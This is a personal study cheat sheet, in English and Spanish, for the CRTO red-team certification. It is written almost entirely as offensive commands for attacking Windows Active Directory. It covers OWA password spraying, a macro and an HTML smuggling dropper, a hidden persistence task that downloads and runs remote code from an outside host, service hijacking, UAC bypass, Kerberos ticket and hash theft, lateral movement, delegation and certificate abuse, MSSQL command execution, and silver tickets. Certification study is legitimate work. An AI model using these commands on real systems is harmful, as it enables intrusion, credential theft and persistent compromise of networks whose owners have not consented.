# CRTO
My own notes to pass the CRTO

# Initial Compromise

## Mail Sniper

Import the Module

```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Check the valid usernames

```
Invoke-UsernameHarvestOWA -ExchHostname mail.domain.local -Domain domain.local -UserList possible_users.txt -OutFile valid.txt
```

Password Spraying

```
Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList valid.txt -Password Password
```

Dump all email accounts

```
Get-GlobalAddressList -ExchHostname mail.domain.local -UserName domain.local\user -Password Password -OutFile users.txt
```

## Visual Basic for Application (Macros)

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "COMMAND"

End Sub
```

## HTML Smuggling

```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
## SMB Beacon
Elegir un Pipename legítimo (coger uno de TSVCPIPE)
```
ls \\.\pipe\
```
Conectarse al beacon
```
link HOST Pipename(C2)
```

# Host Persistence con SharPersist

## Task Scheduler

Encodear el payload

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
```
```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
```
Write-Output $str
```
Configuration of the Host Persistence
```
execute-assembly SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "TASK_NAME" -m add -o [hourly | daily | logon] [-f "filename"] [-k "REGISTRY_KEY_TO_MODIFIE" -v "REGISTRY_KEY_TO_CREATE"]
```

# Host Privilege Escalation

## Windows Services

Mirar los servicios
```
run sc query
```
Mirar las propiedades del servicio
```
run Get-Service | fl
```

## Unquoted Service Paths

Mirar los paths de los servicios
```
run wmic service get name, pathname
```
Mirar los permisos de objetos (carpetas, archivos...)
```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```
Enumerar con SharpUp.exe
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
```
Parar un servicio
```
run sc stop VulnService1
```
Activar un servicio
```
run sc start VulnService1
```

## Weak Service Permissions

Mirar el nombre de los serivicios modificables
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
```
Mirar los permisos con Get-ServiceAcl.ps1 [https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1]
```
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
```
Modificar el path del servicio
```
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
```

## Weak Service Binary Permissions

Ver los permisos del binario
```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```
Copiar el binario
```
copy "tcp-local_x64.svc.exe" "Service 3.exe"
```
## UAC Bypasses
```
elevate uac-schtasks tcp-local
```
# Elevated Host Persistence
## Windows Services
Ir a un directorio con permisos de escritura
```
cd C:\Windows
```
Subir un payload
```
upload C:\Payloads\tcp-local_x64.svc.exe
```
Cambiar el nombre evitar el rastro
```
mv tcp-local_x64.svc.exe legit-svc.exe
```
Añadir el servicio para que se ejecute cuando el equipo se reinicie
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

# Credential Theft

## Kerberos Tickets
Extraer Tickets de Kerberos
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
Coger el TGT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x... /service:krbtgt /nowrap
```

# Domain Reconnaissance

## PowerView

Ver el dominio
```
powershell Get-Domain
```
Ver el dominio, el DC y su OS
```
powershell Get-Domain
```
Ver todos los dominios del bosque
```
powershell Get-ForestDomain
```
Ver la política de contraseñas del dominio
```
powershell Get-DomainPolicyData
```
Ver los grupos a los que pertenece un usuario (Get-DomainUser para ver todos los usuarios)
```
powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
```
Ver todos los ordenadores del dominio
```
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```
Ver todas las OU del dominio
```
powershell Get-DomainOU -Properties Name | sort -Property Name
```
Ver todos los grupos del dominio que tengan la palabra "admin"
```
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
Ver los miembros de un grupo concreto
```
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```
Mirar todas las GPOs del dominio
```
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
```
Mirar las GPOs locales
```
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```
Ver las maquinas donde un grupo del dominio es miembro de un grupo local (util para ver local admins)
```
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
```
Ver la confianza del dominio actual con el resto
```
powershell Get-DomainTrust
```
# User Impersonation (para volver al usuario actual: rev2self)

## Pass The Hash
```
pth dominio\usuario HASH
```
## Pass The Ticket

Coger el LUID e ID del proceso cmd.exe
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```
Pasar el ticket al proceso
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
```
Robar el token
```
steal_token proceso
```
Matar el proceso cuando se haga rev2self
```
kill proceso
```
## Overpass The Hash
Pedir un TGT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user: /ntlm: /opsec /nowrap
```
## Token Impersonation
Listar los procesos
```
ps
```
Robar el token (para guardar el token, usar token-store...)
```
steal_token PID
```
## Make Token
```
make_token dominio\usuario pass
```
## Process Injection
```
inject PID x64 tcp-local
```
# Lateral Movement

## Lateral Movement
Mirar antes el software de la maquina
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=
```
Jump
```
jump [psexec,winrm...] equipo [listener]
```
Remote-exec
```
remote-exec [psexec, winrm...] [listener (SMB mejor)]
```
## WMI
Subir un payload a la maquina
```
cd \\PC\ADMIN$
```
```
upload C:\Payloads\smb_x64.exe
```
```
remote-exec wmi PC C:\Windows\smb_x64.exe
```
# Pivoting
## socks
```
socks 1080
```
## Reverse Port Forwarding
Habilitar firewall
```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```
```
rportfwd victim_port 127.0.0.1 attacker_port
```
# Kerberos

## Kerberoasting
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
```
## ASREPROASTING
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```
## Unconstrained Delegation

Ver los equipos vulnerables a unconstrained delegation
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```
Ponerse escucha para recibir un TGT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```
Forzar la autenticacion de un equipo a nosotros (desde otro equipo)
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe TARGET LISTENER
```
## Constrained Delegation

Mirar si cualquier usuario del equipo puede impersonar el servicio "CIFS" (permite listar y transferir archivos)
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```
Coger el TGT de la maquina y solicitar un TGS
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:usuario_a_impersonar /msdsspn:cifs/equipo /user:maquina /ticket: /nowrap
```
Impersonar un proceso con el ticket
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain: /username:usuario_a_impersonar /password:FakePass /ticket:
```

## Alternate Service Name (en caso de que el puerto 445 este cerrado. Realizar DCSync)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:servicio/equipo /altservice:ldap /user:equipo$ /ticket:doIFpD[...]MuSU8= /nowrap
```
## S4U2Self Abuse (UD no funciona porque el usuario esta logueado)

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:usuario /self /altservice:servicio/equipo /user:equipo$ /ticket: /nowrap
```
## Resource-Based Constrained Delegatoin (SeEnablePrivilege)
Enumerar los equipos vulnerables
```
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```
Obtener el SID
```
powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
```
Cambiar el contenido de "msDS-AllowedToActOnBehalfOfOtherIdentity"
```
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SID)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
```
Usar el TGT del equipo vulnerable
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:usuario_a_impersonar /msdsspn:servicio\/equipo /ticket: /nowrap
```
PTT
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dominio /username:usuario_impersonado /password:FakePass /ticket:
```
## Shadow Credentials
Coger el certificado
```
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:equipo$ /domain:dominio
```
Coger el hash NTLM y hacer PTH
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:certificado /password:"Vt1E6BzV8qehrqkn" /domain:dominio /dc:equipo.dominio /getcredentials /show
```

# Active Directory Certificate Services (ADCS)

## Misconfigured Certificate Templates

Encontrar un certificado vulnerable
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```
Solicitar un certificado
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:nombre_certificado /template:template /altname:usuario_a_impersonar
```
Copiar todo el certificado y ponerlo en un .pem, luego convertirlo a pfx (en un Linux)
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
Pasarlo a Rubeus en base64 para solicitar un TGT
```
cat cert.pfx | base64 -w 0
```
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:usuario_a_impersonar /certificate:base64 /password:pass_elegida /nowrap
```
# Group Policy (GPO)

## Modifying an existing GPO

Mirar las GPOs que se pueden modificar y que pertenezcan a usuarios importantes (Domain Admins, SYSTEM...)
```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```
Resolver cual es la GPO
```
powershell Get-DomainGPO -Identity "CN=(ObjectCN)" | select displayName, gpcFileSysPath
```
Ver quién puede modificar la GPO
```
powershell ConvertFrom-SID S-1-5-21-SID
```
Ver a quién aplica la GPO
```
 powershell Get-DomainOU -GPLink "{}" | select distinguishedName
```
```
powershell Get-DomainComputer -SearchBase "OU=,DC=,DC=,DC=" | select dnsHostName
```
Modificar la GPO
```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b comando" --GPOName "NOMBRE_GPO"
```

# MSSQL (Microsoft SQL Server)
## Enumeración
Importar el módulo de PS para la enumeración de MSSQL
```
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
```
Ver donde se encuentra el MSSQL
```
powershell Get-SQLInstanceDomain
```
Ver si es accesible desde nuestro equipo
```
powershell Get-SQLConnectionTest -Instance "instancia,1433" | fl
```
Información del MSSQL (/m:whoami para ver los roles que tiene nuestro usuario)
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:HOST /module:info
```
Ver los roles de otro usuario
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:DOMINIO /u:USER /p:PASS /h:INSTANCIA /m:whoami
```
Ver los usuarios que son Admins de MSSQL
```
powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```
Mirar el nombre del servidor
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:query /c:"select @@servername"
```
```
powershell Get-SQLQuery -Instance "INSTANCIA" -Query "select @@servername"
```
Acceder desde una maquina Linux con mssqlclient.py
```
proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
```
## Impersonation

Mirar qué usuarios con (ID X) tienen permisos para impersonar a otros usuarios con ID...
```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```
Mirar que usuarios pertenecen a ese ID
```
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```
Impersonar al usuario
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
```
Ejecutar comandos como el usuario
```
EXECUTE AS login = 'domain\user'; SELECT SYSTEM_USER;
```
Ejecutar SQLRecon con el usuario impersonado
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:iwhoami /i:DEV\mssql_svc
```
## Command Execution
Ejecutar codigo con PowerUpSQL
```
powershell Invoke-SQLOSCmd -Instance "INSTANCIA" -Command "whoami" -RawResults
```
### Query
Mirar si XP_CMDSHELL esta activado
```
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
```
Habilitarlo en caso de que esté desactivado
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
```
```
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
Ejecutar comandos
```
EXEC xp_cmdshell "whoami";
```
### SQLRecon
Habilitar XP_CMDSHELL
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:ienablexp /i:DEV\mssql_svc
```
Ejectuar codigo con XP_CMDSHELL
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```
## Lateral Movement
### Query
Mirar los links de la instancia
```
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
```
Ejecutar queries en otro servidor
```
SELECT * FROM OPENQUERY("HOST", 'select @@servername');
```
### SQLRecon
Mirar los links de la instancia
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:links
```
Ejecutar queries en otro servidor
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA1 /m:lquery /l:HOST2 /c:"select @@servername"
```
Mirar permisos en otro servidor
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:INSTANCIA /m:lwhoami /l:HOST2
```
Mirar si XP_CMDSHELL esta activado en el otro servidor
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
```
Si XP_CMDSHELL esta desactivado, solo si está RPC OUT habilitado se podrá activar con
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [SERVIDOR]
```
```
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [SERVIDOR]
```
Mirar si el otro serviodor tiene mas links
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
```
```
powershell Get-SQLServerLinkCrawl -Instance "INSTANCIA1"
```
Ejecutar codigo en el otro servidor
```
SELECT * FROM OPENQUERY("HOST", 'select @@servername; exec xp_cmdshell ''command''')
```
## MSSQL Privilege Escalation
Mirar los privilegios actuales
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
```
Si puede impersonar a cualquier usuario se fuerza la autenticacion de un NT Authority\SYSTEM
```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc ..."
```
# Domain Dominance
## Silver Ticket (TGS)
Coger el SID de los dominios
```
powershell (Get-ADForest).Domains| %{Get-ADDomain -Server $_} | Select-Object name, domainsid
```
Dumpear llaves de Kerberos
```
mimikatz !sekurlsa::ekeys
```
En la otra maquina, crea un TGS con los datos
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/EQUIPO_LLAVES_KERBEROS.DOMINIO /aes256:LLAVE_KERBEROS /user:USUARIO /domain:DOMINIO /sid:SID_DOMINIO /nowrap
```

# Forest & Domain Trusts
## Parent/Child
Enumerar Dominios
```
powershell Get-DomainTrust
```
Nombre del DC del dominio
```
powershell Get-DomainController -Domain DOMINIO | select Name
```
